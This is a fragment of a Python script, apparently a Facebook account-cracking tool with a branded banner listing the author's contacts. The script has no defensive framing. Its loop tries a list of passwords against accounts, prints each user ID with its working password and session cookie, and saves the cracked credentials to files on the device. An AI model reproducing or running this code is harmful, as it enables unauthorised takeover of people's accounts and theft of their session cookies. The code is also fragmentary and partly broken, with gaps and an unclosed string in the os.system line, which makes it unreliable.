...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/hunterboyonik07?mibextid=ZbWKwL)
logo =("""\033[0;92m
\033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
\033[1;32m║	         \033[1;93m ─━<❤️‍🩹Assalamu Alaikum❤️‍🩹>━─\033[1;32m	           ║
\033[1;32m╔══════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;92m::'  #######::'##::: ##:'####:'##:::'##:
\033[1;32m║\033[0;97m...' ##.... ##: ###:: ##:. ##:: ##::'##::
\033[1;32m║\033[0;91m::: ##:::: ##: ####: ##:: ##:: ##:'##:::
...
\033[1;34m║AUTHOR    : Mr ONIK             ║║       \x1b[1;91m|__-__|\033[1;32m        ║
\033[1;35m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
\033[1;36m║WHATSAPP  : 01918397961           ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
\033[1;37m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
\033[1;38m║GITHUB    : Mronik404           ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;39m║══════════════════════════════════║║                      ║
\033[1;31m║SERVER    : DATA :      WORKING   ║╚══════════════════════╝
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;33m║FACEBOOK LINK : \x1b[1;91hhttps://www.facebook.com/hunterboyonik07?mibextid=ZbWKwL\033[1;32m║
\033[1;34m║══════════════════════════════════════════════════════════║
\033[1;35m║PAGE: \x1b[1;91https://www.facebook.com/hunterboyonik07?mibextid=ZbWKwL033[1;32m ║
\033[1;36m╚══════════════════════════════════════════════════════════╝\033[1;37m""") 
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ONIK-OK💯] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎💟]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ONIK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/ONIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
